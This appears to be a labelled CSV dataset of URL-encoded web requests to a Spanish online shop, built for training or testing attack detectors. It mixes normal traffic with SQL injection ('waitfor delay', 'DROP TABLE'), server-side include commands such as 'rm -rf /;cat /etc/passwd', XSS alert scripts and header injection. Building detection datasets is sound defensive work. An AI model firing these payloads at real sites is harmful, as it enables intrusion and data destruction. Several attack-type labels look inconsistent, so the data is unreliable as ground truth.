payload,attack_type,label
modo=entrar&login=jon%3Felle&pwd=9rupa&remember=on&B1=Entrar,cmdi,1
idA=2,normal,1
modo=insertar&precio=%22%3E%3C%21--%23EXEC+cmd%3D%22dir+%22--%3E%3C&B1=Confirmar123,sqli,1
modo=entrar&login=yenmeng&pwd=ceguezuelo&remember=on&B1=%253CSCRIPT%253Ealert%2528%2522Paros%2522%2529%253B%253C%252FSCRIPT%253E123,xss,1
B2=Vaciar+carrito123,normal,0
id=3&nombre=Vino+Rioja&precio=85&cantidad=87&B1=A%F1adir+al+carrito,normal,0
MODO=ENTRARPAROS%2522%2bSTYLE%253d%2522BACKGROUND%253aURL%2528JAVASCRIPT%253aALERT%2528%2527pAROS%2527%2529%2529%26ID%3d2&LOGIN=ODELE&PWD=19LER8Z6R&REMEMBER=ON&b1=eNTRAR,xss,1
id=1&nombre=Jam%F3n+Ib%E9rico&precio=39&cantidad=51&B1=A%F1adir+al+carrito123,normal,0
modo=entrar&login=nichole&pwd=1EM5lE28r&remember=on&B1=Entrar123,normal,0
modo=insertar%27%2C%270%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--&precio=3732&B1=Confirmar,sqli,1
modo=insertar&precio=1538&B1=Pasar+por+caja,normal,0
modo=entrar&login=marge&pwd=g1ne136&remember=on&B1=Entrar,normal,0
modo=registro&login=mcarthur&password=g53ON3a9u56&nombre=Efra%EDn&apellidos=Virhuez+Prats&email=sripatimakul%40forohh.ic&dni=08968667R&direccion=Camino+El+Pino%2C+151%2C+5-B&ciudad=Argujillo&cp=39450&provincia=Badajoz&ntc=7202990502846857&B1=Registrar,normal,0
modo=registro&login=+&password=C9R1uitA&nombre=Dip&apellidos=Cerde%F1o&email=rosenthal%40tintasultravioleta.pm&dni=90702877P&direccion=C%2F+Maria+De+Molina+177%2C+8%3FG&ciudad=Espada%F1edo&cp=25211&provincia=Zamora&ntc=1811910375408789&B1=Registrar,cmdi,1
modo=insertar&precio=2888&b1=confirmar,normal,0
modo=entrar&login=von_semm&pwd=re413t8208o&remember=on&B1=Entrar,normal,0
modo=registro&loginA=mccreesh&password=ce%F1idura&nombre=Nadia&apellidos=Pinet+Moradell&email=fargher%40cpanelweb.com.pr&dni=11152900Q&direccion=Calle+Felix+Boix%2C+58+&ciudad=Alt+%C0neu&cp=05194&provincia=Burgos&ntc=2255812100125453&B1=Registrar,cmdi,1
id=1,normal,0
errorMsg=%22%3E%3C%21--%23EXEC+cmd%3D%22dir+%22--%3E%3C123,sqli,1
modoA=entrar&login=dokken8&pwd=PaRLaNch%EDn&remember=off&B1=Entrar,cmdi,1
modo=any%250ASet-cookie%253A%2BTamper%253D1041264011025374727&login=soucie6&pwd=3fistol23&remember=on&B1=Entrar,cmdi,1
modo=registro&login=kapil&password=d1c36o4ca&nombre=Berina+del+Valle&apellidos=Artico&email=meunier.langa%40tintasultravioleta.al&dni=17826694S&direccion=C%2F+Historiador+Rodrigo+Pertegas%2C+149%2C+8-E&ciudad=Palafolls%27%2C%270%27%2C%270%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--&cp=25218&provincia=C%E1ceres&ntc=3256313581077416&B1=Registrar,sqli,1
B2=Vaciar+carrito,normal,0
id=2,normal,0
id=2123,normal,0
modo=registro&login=norean&password=kri%21sti&nombre=Suray&apellidos=Sogorb+Ipamo&email=cuccu%40professionalhosting.com.uz&dni=20098056N&direccion=Paratge+Barnades%2C+43+&ciudad=Zaldibia&cp=18340&provincia=Le%F3n&ntc=5223158056651718&B1=Registrar,normal,0
modo=insertar&precio=7105%22+AND+%221%22%3D%221&B1=Pasar+por+caja,cmdi,1
id=2&nombre=Queso+Manchego&precio=39&cantidad=97&B1=A%F1adir+al+carrito,normal,0
id=1&nombre=Vino+Rioja&precio=85&cantidad=%257C&B1=A%F1adir+al+carrito,cmdi,1
modo=registro&login=clarita&password=2e720lOn7r&nombre=Quirico&apellidos=Mart%EDnez&email=goodier_igus%40catanoticias.sd&dni=37035771K&direccionA=Avenida+Casado+Del+Alisal%2C+70+&ciudad=Santa+Eulalia+Bajera&cp=42311&provincia=Tarragona&ntc=9017290902673113&B1=Registrar,cmdi,1
modo=entrar&login=colin&pwd=quer%dabico&remember=off&b1=entrar,normal,0
id=1&nombre=Queso+Manchego&precio=100&cantidad=53&B1=A%F1adir+al+carrito123,normal,0
B2=Vaciar+carrito,normal,0
id=3&nombre=Queso+Manchego&precio=85&cantidad=15&B1=A%F1adir+al+carrito,normal,0
modo=registro&login=einersen&password=despagada&nombre=Emanuel&apellidos=Sarrasec+Ar%E9valo&email=gottowt%40enibiza.com.es&dni=96118316M&direccion=Passatge+Del+Sol%2C+0+13%3FD&ciudad=Megeces&cp=42148&provincia=%3FC%E1d%3Fi%2Fz&ntc=8462242772116416&B1=Registrar,cmdi,1
modo=insertar&precio=1526&B1=Pasar+por+caja,normal,0
id=2&nombre=Queso+Manchego&precio=85%27+DELETE+FROM+USERS&cantidad=1&B1=A%F1adir+al+carrito,cmdi,1
modo=registro&login=junkie&password=5arin3-ro&nombre=Sol&apellidos=Ferrada+Montull&email=macnee-voringer%40b-sign.sb&dni=61302831B&direccion=C%2F+Timoteo+Martin%2C+24+7%3FG%2520&ciudad=Quintanilla+de+Arriba&cp=49639&provincia=Barcelona&ntc=6741458111555390&B1=Registrar,cmdi,1
id=2&nombre=Queso+Manchego&precio=%3C%21--%23EXEC+cmd%3D%22ls+%2F%22--%3E&cantidad=86&B1=A%F1adir+al+carrito123,sqli,1
modo=registro&login=trung&password=fragmentar&nombre=quiyen&apellidos=calle+junco&email=ricci%40redhost.is&dni=89821319v&direccion=pl.+herrera+de+los+navarros+68+12-h&ciudad=palacios+del+arzobispo&cp=11380&provincia=%c1lava&ntc=8322438262219801&b1=registrar,normal,0
id=2&nombre=Queso+Manchego&precio=39&cantidad=34&B1=A%F1adir+al+carrito,normal,0
idA=2,normal,1
b2=BOB%2540%253cscrIPT%253eALERT%2528pAROS%2529%253c%252fSCRipt%253e.PAROSPROXY.ORG,xss,1
modo=insertar&precioA=6857&B1=Confirmar,cmdi,1
ERRORmSG=%27%2c%270%27%2c%270%27%2c%270%27%2c%270%27%29%3bWAITFOR+DELAY+%270%3a0%3a15%27%3b--,sqli,1
id=3&nombre=vino+rioja&precio=39&cantidad=74&b1=a%f1adir+al+carrito,normal,0
modo=insertar&precio=5639&B1=Confirmar,normal,0
b2a=vaciar+carrito,normal,1
modo=registro&login=toperzer1&password=sUfRaGIO&nombre=Oziel&apellidos=Mar%ED+Mendivil&email=rattenbury_roquette%40ibizasounds.gh&dni=69539711Q&direccion=Calle+Ecuador+143+&ciudad=Gallegos+de+Arga%F1%E1n&cp=03580&provincia=Toledo&ntc=1940931931153821&B1=Registrar,normal,0
B2A=Vaciar+carrito,normal,1
modo=entrar&login=deiad%2Frel&pwd=escinco&remember=on&B1=Entrar,cmdi,1
errorMsgA=Credenciales+incorrectas,normal,1
modo=registro&login=thompson&password=60sc94o&nombre=galdino&apellidos=roca&email=baarova%40hrmsl.mil&dni=58305784w&direccion=salgueiro+188+&ciudad=aguar%f3n&cp=37763&provincia=tarragona&ntc=8912004350396189&b1=registrar,normal,0
modo=registro&login=ezella&password=CU25439y&nombre=Hedda&apellidos=Ojeda+Fita&email=mallott%40edifico.bf&dni=63897551D&direccion=C%2F+Ferriol%2C+105+11%3FD&ciudad=Begues&cp=06390&provincia=Le%F3n&ntc=7359610101148401&B1=Registrar123,normal,0
MODO=REGISTRO&LOGIN=DIMITRIO&PASSWORD=A30T0NA8&NOMBRE=zELMAR&APELLIDOS=mANJ%f3N+mONTOLIO&EMAIL=LOVELLE.LORENTE%40RINGRINGRENT.ASIA&DNI=19110618x&DIRECCION=aLAMEDA+pRINCIPAL%2c+180+&CIUDAD=%27%2c%270%27%2c%270%27%29%3bWAITFOR+DELAY+%270%3a0%3a15%27%3b--&CP=40291&PROVINCIA=gUIP%faZCOA&NTC=2985545355401012&b1=rEGISTRAR,sqli,1
modo=entrar&login=ziemba&pwd=bAnDAd_a&remember=on&B1=Entrar,normal,0
modo=insertar&precio=7361&b1=confirmar,normal,0
errorMsg=Credenciales+incorrectas123,normal,0
modo=registro&login=linas&password=ceRd24a&nombre=Eranio&apellidos=Cus%F3+Motj%E9&email=twist.dangerfield%40beltoan.com.ne&dni=90907663W&direccion=Once+S%2FN+&ciudad=Ol%EDas+del+Rey&cp=37219&provincia=Lleida&ntc=6481855129498664&B1=Registrar,normal,0
errorMsgA=Credenciales+incorrectas,normal,1
modo=registro&login=scott&password=retr8t2&nombre=reinaldo&apellidos=pampanas+soto&email=poncin%40todobetis.mil&dni=72429722p&direccion=plza.+magallanes%2c+50+&ciudad=miranda+de+arga&cp=14640&provincia=navarra&ntc=3655911674701564&b1=registrar,normal,0
id=2,normal,0
modo=entrar&login=coloads&pwdA=riosellano&remember=off&B1=Entrar,cmdi,1
modo=entrar&login=cetraro&pwd=eSqUILero&remember=off&B1=Entrar123,normal,0
id=2&nombre=Vino+Rioja&precio=85&cantidad=97&B1=A%F1adir+al+carrito,normal,0
errorMsg=Credenciales+incorrectas123,normal,0
errorMsg=Credenciales+incorrectas%3C%21--%23exec+cmd%3D%22rm+-rf+%2F%3Bcat+%2Fetc%2Fpasswd%22+--%3E,sqli,1
errorMsg=Credenciales+incorrectas%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--,sqli,1
B2=Vaciar+carrito,normal,0
id=2&nombre=Jam%F3n+Ib%E9rico&precio=100&cantidad=74&B1A=A%F1adir+al+carrito,cmdi,1
B2=Vaciar+carrito,normal,0
modo=insertar&precio=6606&B1=Pasar+por+caja%2F,cmdi,1
modo=entrar&login=blan%2C%2Fch%2Fa&pwd=atAjadA&remember=on&B1=Entrar,cmdi,1
modo=insertarparos%2522%2Bstyle%253D%2522background%253Aurl%2528javascript%253Aalert%2528%2527Paros%2527%2529%2529%26id%3D2&precio=8145&B1=Confirmar123,xss,1
modo=entrar&login=%27%27dien*a&pwd=maridablemente&remember=on&B1=Entrar,cmdi,1
modo=insertar&precio=8275&B1=Confirmar,normal,0
modo=registro&login=buhler&password=8ntrepei388&nombre=Edisa&apellidos=Pando+Rebull&email=charney%40pro-isfv.mp&dni=27478839A&direccion=Las+Acacias+13%2C+11-A&ciudad=Marcilla+de+Campos&cp=48320&provincia=.Bu%2F%2Frgos&ntc=6512218837130409&B1=Registrar,cmdi,1
modo=registro&login=proffit&password=5pio&nombre=Naimi&apellidos=Vallart+Casabella&email=lagrange%40zaya.bt&dni=09621588K&direccion=C%2F+Pedro+Lagasca%2C+176%2C+&ciudad=San+Mill%E1n%2FDonemiliaga&cp=12191&provincia=Tarragona&ntc=6659103638292546&B1=Registrar,normal,0
b2a=vaciar+carrito,normal,1
errorMsgA=Credenciales+incorrectas,normal,1
id=3&nombre=Queso+Manchego&precioA=39&cantidad=67&B1=A%F1adir+al+carrito,cmdi,1
errorMsg=paros%2522%2Bstyle%253D%2522background%253Aurl%2528javascript%253Aalert%2528%2527Paros%2527%2529%2529%26id%3D2,xss,1
modo=insertar&precio=8903&B1=Confirmar,normal,0
B2=Vaciar+carrito,normal,0
modo=entrar&login=nezm&pwd=1Eb5l0e&remember=off&B1=Entrar%3C%21--%23EXEC+cmd%3D%22ls+%2F%22--%3E123,sqli,1
modo=registro&login=alzofon&password=0in5fera&nombre=Rosario&apellidos=Narva&email=stadbauer%40aadsl.de&dni=77987215B&direccion=Passatge+Serracant%2C+34+7-C%253CSCRIPT%253Ealert%2528%2522Paros%2522%2529%253B%253C%252FSCRIPT%253E&ciudad=Azaila&cp=18132&provincia=Almer%EDa&ntc=1281089993352659&B1=Registrar123,xss,1
id=1,normal,0
id=3&nombre=Jam%F3n+Ib%E9rico&precio=100&cantidad=87&B1=A%F1adir+al+carrito123,normal,0
modo=registro&login=perrier&password=limitable&nombre=Romana&apellidos=Due%F1as+Cristaldo&email=rei1%40rtce.au&dni=58265705N&direccion=Calle+Padre+Arintero%2C+149+&ciudad=Navalperal+de+Tormes&cp=45112&provincia=Madrid&ntc=3454478326370479&B1=Registrar,normal,0
modo=insertar&precio=41%22+AND+%221%22%3D%221&B1=Confirmar,cmdi,1
modo=entrar&login=norberto&pwd=comparendo&remember=off&B1=Entrar,normal,0
modo=insertar&precio=5289&B1=Pasar+por+caja%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--,sqli,1
id=3&nombre=Jam%F3n+Ib%E9rico&precio=85&cantidad=93&B1=A%F1adir+al+carrito,normal,0
modo=insertar&precio=8916&B1=Confirmar123,normal,0
id=3&nombre=Vino+Rioja&precio=39&cantidad=%27+AND+%271%27%3D%271&B1=A%F1adir+al+carrito,cmdi,1
MODO=REGISTRO&LOGIN=DARN&PASSWORD=56Rp10A4&NOMBRE=rAVI&APELLIDOS=mORELL&EMAIL=COSTA_LEJEUNE%40CLICHOTEL.MY&DNI=16929821g&DIRECCION=iNGENIERO+mARI%f1O%2c+170+10-a&CIUDAD=pARETS+DEL+vALL%e8S&CP=20577&PROVINCIA=%27%2c%270%27%29%3bWAITFOR+DELAY+%270%3a0%3a15%27%3b--&NTC=7457334236490109&b1=rEGISTRAR,sqli,1
B2=%27%3Bwaitfor+delay+%270%3A0%3A15%27%3B--,sqli,1
errormsg=credenciales+incorrectas,normal,0
B2=Vaciar+carrito,normal,0
errorMsgA=Credenciales+incorrectas123,normal,1
B2=any%250ASet-cookie%253A%2BTamper%253D1041264011025374727,normal,1
modo=entrar&login=chueh5&pwd=%C137cE&remember=on&B1=Entrar,normal,0
b2a=vaciar+carrito,normal,1
modo=registro&login=thuong&password=H78N7Ce30&nombre=Hildebaldo&apellidos=Saiz&email=longo%40elbauldelosrefranes.web&dni=19482682A&direccion=C%2F+Valladolid+194%2C+6%3FB&ciudad=Garcill%E1n&cp=46891&provincia=Valencia&ntc=2473105316988907&B1=Registrar,normal,0
modo=insertar&precio=3796%253CSCRIPT%253Ealert%2528%2522Paros%2522%2529%253B%253C%252FSCRIPT%253E&B1=Pasar+por+caja123,xss,1
modo=entrar&login=lacoste&pwd=h9erc5&remember=on&b1=entrar,normal,0
modo=registro&login=kam%3Fins%2Fky&password=sonetO&nombre=Leslie&apellidos=Arrotcharen+Doniz&email=bernstein%40beltoan.com.ck&dni=11552656D&direccion=U%F1as+83%2C+&ciudad=Villatuelda&cp=44410&provincia=Segovia&ntc=3775854370379113&B1=Registrar,cmdi,1
MODO=INSERTARBOB%2540%253cscrIPT%253eALERT%2528pAROS%2529%253c%252fSCRipt%253e.PAROSPROXY.ORG&PRECIO=8318&b1=pASAR+POR+CAJA,xss,1
errorMsg=Credenciales+incorrectasbob%2540%253CSCRipt%253Ealert%2528Paros%2529%253C%252FscrIPT%253E.parosproxy.org123,xss,1
modo=entrar&login=yoonmo2&pwd=azo5da&remember=on%2F&B1=Entrar,cmdi,1
idA=2,normal,1
b2=vaciar+carrito,normal,0
modo=insertar&precio=5400&B1=Pasar+por+caja,normal,0
modo=registro&login=mundy&password=zarrapastrosamente&nombre=Felisa&apellidos=Lecuona+Gasull&email=priestley%40stockdefotos.vu&dni=02143129N&direccion=C%2F+Garcia+Mosquera%2C+184%2C+&ciudad=Castellanos+de+Moriscos&cp=37254&provincia=Navarra&ntc=6206191254660151&B1=Registrar123,normal,0
errorMsg=Credenciales+incorrectas123,normal,0
modo=insertar&precio=4831&B1=Confirmar%3F,cmdi,1
modo=registro&login=mellisen&password=ATaCado&nombre=Sacha&apellidos=Guizasola+Curiel&email=templey%40sgi-sl.ps&dni=49723912M&direccion=Calle+Cardenal+Gardoqui+62%2C+&ciudad=Canal+de+Berd%FAn&cp=25125&provincia=Zamora&ntc=367411357982441A&B1=Registrar,cmdi,1
id=2123,normal,0
B2=Vaciar+carrito,normal,0
errorMsg=%3C%21--%23include+file%3D%22archivo_secreto%22+--%3E,sqli,1
modo=registro&login=strauss&password=manirrota&nombre=Dania&apellidos=Cucurull+Forn%27INJECTED_PARAM&email=everrett%40fernandosoto.zr&dni=34016342D&direccion=Doctor+Gomez+Ulla%2C+7+13B&ciudad=Boada+de+Campos&cp=45573&provincia=Tarragona&ntc=9293437709151698&B1=Registrar,cmdi,1
errormsg=credenciales+incorrectas,normal,0
modo=registro&login=scottie&password=Mi2l1n%C9si6o&nombre=Eros&apellidos=Alcina+Carameso&email=rawlings8%40tantomontamontatanto.bu&dni=39890773X&direccion=Paraguay+122%2C+&ciudad=%3FZuf.r.e&cp=39085&provincia=Barcelona&ntc=6182221235655395&B1=Registrar,cmdi,1
B2=%22%3E%3C%21--%23EXEC+cmd%3D%22dir+%22--%3E%3C123,sqli,1
errorMsg=Credenciales+incorrectas,normal,0
errorMsg=Credenciales+incorrectas,normal,0
modo=registro&login=slinowsk&password=b4c2chu0&nombre=Chera%ED&apellidos=Jorda+Escol%E0&email=dai-line%40gay-tantra.ma&dni=97610819S&direccion=C%2F+Vulcano+29+&ciudad=Manzanillo&cp=5037A&provincia=%C1vila&ntc=4772503716652699&B1=Registrar,cmdi,1
id=2,normal,0
modo=insertar&precio=6861&B1=Pasar+por+caja,normal,0
idA=1&nombre=Jam%F3n+Ib%E9rico&precio=85&cantidad=36&B1=A%F1adir+al+carrito,cmdi,1
modo=entrar&login=quinn&pwd=incisivo&remember=off&B1=Entrar,normal,0
errorMsg=%27%2C%270%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--,sqli,1
idA=2,normal,1
modo=registro&login=chaudhar&password=agres%3fiva&nombre=tel%e9sfora&apellidos=cuero+slachevsky&email=abbe%40natravea.tk&dni=67872602q&direccion=ramiro+de+maeztu%2c+s%2fn+8c&ciudad=ventas+de+retamosa%2c+las&cp=18327&provincia=huelva&ntc=7378889316326396&b1=registrar,normal,0
modo=registro&login=melbourn&password=Ja.HaR%CD&nombre=Federico&apellidos=Banchieri+Romaguer&email=nalbach0%40softwaremasservicio.aero&dni=00930465T&direccion=C%2F+Andorra%2C+71+&ciudad=Olmeda+de+la+Cuesta&cp=06760&provincia=Soria&ntc=5955499779082476&B1=Registrar,normal,0
id=%2B,normal,1
modo=registro&login=nuttall&password=7alcar19&nombre=Pericles&apellidos=Forn%E9s+Rigall&email=trejan%40carloshoya.mo&dni=22997473A&direccion=Calle+Jose+Lopez+Tafall+192+&ciudad=Barrio+de+Mu%F1%F3&cp=24429&provincia=Santa+Cruz+de+Tenerife&ntc=1702414193720942&B1=Registrar,normal,0
modo=insertar&precio=7020&B1=Pasar+por+caja%2F,cmdi,1
id=%252B123,normal,1
modo=registro&login=massinga&password=reSPALdar&nombre=Peregrino&apellidos=O%F1ate+Leguisamo&email=armida%40automovilesalhambra.pl&dni=65278169Y&direccion=C%2F+Canal%2C+25%2C+9%3FF&ciudad=Azkoitia&cp=38911&provincia=Salamanca&ntc=561993959286828&B1=Registrar,cmdi,1
modo=registro&login=siva0&password=eSOT%C9R2ca&nombre=Fede&apellidos=Romera+Zuleta&email=dacgnault%40ajuntamentbarcelona2-0.name&dni=34382308E&direccion=C%2F+Cuellar+177+%27INJECTED_PARAM&ciudad=Albalate+de+las+Nogueras&cp=24915&provincia=Segovia&ntc=8975566519527853&B1=Registrar,cmdi,1
modo=registro&login=celka&password=7o14c0o&nombre=edilnerto&apellidos=gasull+vadell&email=sikes-jeans%40923.mv&dni=72684781c&direccion=paratge+palmira%2c+112%2c+5-b&ciudad=santa+eul%e0lia+de+ron%e7ana&cp=16707&provincia=tarragona&ntc=0466431001368094&b1=registrar,normal,0
modo=registro&login=jyoti&password=dechado&nombre=Alcui.%2Fno&apellidos=Bori+Raich&email=varhelyi_krzyzewska%40santacruzdelvoto.mw&dni=87721362Y&direccion=Dulcinea%2C+158%2C+4%3FG&ciudad=Valverde+del+Camino&cp=19190&provincia=Cuenca&ntc=4412645005602081&B1=Registrar,cmdi,1
MODO=REGISTRO%27%2c%270%27%29%3bWAITFOR+DELAY+%270%3a0%3a15%27%3b--&LOGIN=CHEVARIE&PASSWORD=9L67I02N4E&NOMBRE=yAMAND%fa&APELLIDOS=iVERN&EMAIL=OLTEANU%40ELCARRITODELACOMPRA.RW&DNI=35537130z&DIRECCION=pLZA.+jUVENTUD+85%2c+&CIUDAD=oRENDAIN&CP=07190&PROVINCIA=c%e1CERES&NTC=5864932809753422&b1=rEGISTRAR,sqli,1
errorMsg=any%253F%250D%250ASet-cookie%253A%2BTamper%253D1041264011025374727,normal,1
modo=registro&login=rintel&password=7a03i9a08RIO&nombre=Zenaida&apellidos=Baeza+Redon&email=long%40todomodelos.tg&dni=17103014F&direccion=Passatge+Permanyer%2C+53%2C+7D&ciudad=Urue%F1as&cp=34192&provincia=Salamanca&ntc=7402575875977830&B1=Registrar,normal,0
modo=insertar&precio=4221&B1=Pasar+por+caja%2F,cmdi,1
idA=1,normal,1
id=1&nombre=Vino+Rioja&precio=100&cantidad=98&B1=A%F1adir+al+carrito123,normal,0
MODO=REGISTRO&LOGIN=MOESCHET&PASSWORD=faSTId%3fiOSO&NOMBRE=vAHIDrEZA&APELLIDOS=tORAL+pINE&EMAIL=URAY%40HOSTERIALASMAJADILLAS.PT&DNI=79928493c&DIRECCION=dIDO+162%2c+&CIUDAD=aLDEANUEVA+DE+eBRO&CP=50001%22%3e%3c%21--%23exec+CMD%3d%22DIR+%22--%3e%3c&PROVINCIA=mADRID&NTC=6010532265403807&b1=rEGISTRAR,sqli,1
modo=entrar&login=martens&pwd=ha3%f3fila&remember=off&b1=entrar,normal,0
id=1paros%2522%2Bstyle%253D%2522background%253Aurl%2528javascript%253Aalert%2528%2527Paros%2527%2529%2529%26id%3D2123,xss,1
id=%27%3B+DROP+TABLE+usuarios%3B+SELECT+*+FROM+datos+WHERE+nombre+LIKE+%27%25123,sqli,1
modo=registro&login=chaisupa8&password=pSi-qUiatr%EDa%27%3Bwaitfor+delay+%270%3A0%3A15%27%3B--&nombre=Renovato&apellidos=Pellitero+Gavas&email=cucciola_abdeslam9%40gesautonomos.pk&dni=05392148M&direccion=Calle+Lanjaron%2C+193+5G&ciudad=Rionansa&cp=26125&provincia=La+Rioja&ntc=8795418458283406&B1=Registrar,sqli,1
modo=registro&login=thurston&password=do%F1A&nombre=Severiano&apellidos=Ba%F1os+Vilarrasa&email=kenna.losch%40lapasteleria.co&dni=81587737K&direccion=Cuesta+De+La+Baronesa%2C+192+&ciudad=Mendavia&cp=42148&provincia=Badajoz&ntc=2955362833372766&B1=Registrar,normal,0
B2=%27OR%27a%3D%27a,normal,1
MODO=REGISTRO&LOGIN=THATCHER7&PASSWORD=V8iMAR4S8&NOMBRE=eBE&APELLIDOS=iNIESTA+cOM%edN&EMAIL=QUENSEL%40GUERRERODELBIENESTAR.KE&DNI=71247717l&DIRECCION=c%2f+lAVANDA%2c+81%2c+12b&CIUDAD=%cdSCAR&CP=37082%27%29%3bWAITFOR+DELAY+%270%3a0%3a15%27%3b--&PROVINCIA=mADRID&NTC=3448589549551103&b1=rEGISTRAR,sqli,1
modo=registro&login=dimitrio&password=a30t0na8&nombre=Zelmar&apellidos=Manj%F3n+Montolio&email=lovelle.lorente%40ringringrent.asia&dni=19110618X&direccion=Alameda+Principal%2C+180+&ciudad=%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--&cp=40291&provincia=Guip%FAzcoa&ntc=2985545355401012&B1=Registrar123,sqli,1
modo=registro&login=vachiran&password=0om7rera&nombre=Kenji&apellidos=Molet&email=alden%40b-sign.sv&dni=51942267X&direccion=Luis+Diaz+Cobe%F1a%2C+98%2C+&ciudad=Sant+Andreu+de+la+Barca&cp=28609&provincia=Badajoz&ntc=2557912970687783&B1=Registrar,normal,0
modo=insertar&precio=8478&B1=Confirmar%2F,cmdi,1
modo=registro&login=tse&password=orientalista&nombre=Victoria+de+los+Angeles&apellidos=Ventura+Mot%ECn&email=sala%40mystyleperfume.ls&dni=58157080Q&direccion=Roure%2C+43%2C+3%3FD&ciudad=Hontanares+de+Eresma&cp=32648&provincia=%C1vila&ntc=7771884953425478&B1=Registrar123,normal,0
modo=entrar&login=samboparos%2522%2520style%3D%2522background%3Aurl%28javascript%3Aalert%28%27Paros%27%29%29&pwd=*insu6u8abl3&remember=on&B1=Entrar,xss,1
B2=%3C%21--%23EXEC+cmd%3D%22ls+%2F%22--%3E,sqli,1
modo=registro&login=ilya&password=papali%24no&nombre=nedar&apellidos=casasnova+vadal%e1&email=klee8%40farma-job.fj&dni=86090489v&direccion=c%2f+zilbetiko+monasterioaren%2c+s%2fn%2c+&ciudad=pont+de+bar%2c+el&cp=17467&provincia=huesca&ntc=7110252413473830&b1=registrar,normal,0
modo=registro&login=depalma&password=atabillar&nombre=Dacio&apellidos=Sagues+Villacro&email=lerumeur%40phd-photodecor.sj&dni=15984899Z&direccion=Mesonero+Romanos%2C+S%2FN%2C+2%3FB&ciudad=Astigarraga&cp=18340&provincia=Ciudad+Real&ntc=0957221958877630&B1=Registrar,normal,0
b2=vaciar+carrito,normal,0
id=1%2F&nombre=Vino+Rioja&precio=85&cantidad=32&B1=A%F1adir+al+carrito,cmdi,1
B2=Vaciar+carrito%257C123,normal,1
id=2,normal,0
modo=registro&login=%3C%21--%23exec+cmd%3D%22rm+-rf+%2F%3Bcat+%2Fetc%2Fpasswd%22+--%3E&password=l53%2420a5i5&nombre=Epuyen&apellidos=Monz%F3+Turu&email=treacher-johnson%40pinturasultravioleta.mk&dni=93658215F&direccion=Urbanizacion+Montesion%2C+3+&ciudad=Aoiz%2FAgoitz&cp=39640&provincia=Salamanca&ntc=1895469011099422&B1=Registrar123,sqli,1
modo=entrar&login=bagnato33&pwd=p9n4o52s0a&remember=off%2F&B1=Entrar,cmdi,1
id=%2500,normal,1
modo=entrar&login=gavens0&pwd=b99e4ic5ino&remember=off%2F&B1=Entrar,cmdi,1
ID=1&NOMBRE=vINO+rIOJA&PRECIO=85%253cscript%253eALERT%2528%2522pAROS%2522%2529%253b%253c%252fscript%253e&CANTIDAD=96&b1=a%f1ADIR+AL+CARRITO,xss,1
errorMsg=Credenciales+incorrectas,normal,0
id=3&nombre=Vino+Rioja&precio=100&cantidad=34&B1=A%F1adir+al+carrito,normal,0
b2=%22%3e%3c%21--%23exec+CMD%3d%22DIR+%22--%3e%3c,sqli,1
id=2,normal,0
errorMsg=Credenciales+incorrectas,normal,0
modo=registro&login=jasper&password=lebrillo&nombre=vivaldo&apellidos=geli+febo&email=tchjan-lian.quadflieg%40comerciosdeaspe.se&dni=85510378n&direccion=av.+pablo+iglesias+106%2c+&ciudad=almog%eda&cp=31560&provincia=badajoz&ntc=7509082311963954&b1=registrar,normal,0
errorMsg=%252B123,normal,1
modo=insertar&precio=6987&B1=paros%2522%2Bstyle%253D%2522background%253Aurl%2528javascript%253Aalert%2528%2527Paros%2527%2529%2529%26id%3D2,xss,1
modo=registro&login=hadel&password=hatajo&nombre=yasna&apellidos=brivio&email=hymen_israeli%40aulahost.vc&dni=75010741j&direccion=cami+llorito%2c+38+&ciudad=a%ednsa-sobrarbe&cp=43713&provincia=%c1lava&ntc=5968115219030593&b1=registrar,normal,0
B2A=Vaciar+carrito123,normal,1
id=1&nombre=Vino+.*%3FRioja&precio=100&cantidad=71&B1=A%F1adir+al+carrito,cmdi,1
errorMsg=Credenciales+incorrectas123,normal,0
modo=registro&login=gray&password=2s4e49&nombre=Sadao&apellidos=Mengual+Bartumeu&email=mckinnell%40arvigar.eu&dni=43595909F&direccion=Calle+Arenal+153%2C+&ciudadA=Hornos+de+Moncalvillo&cp=34349&provincia=Granada&ntc=4118559502333875&B1=Registrar,cmdi,1
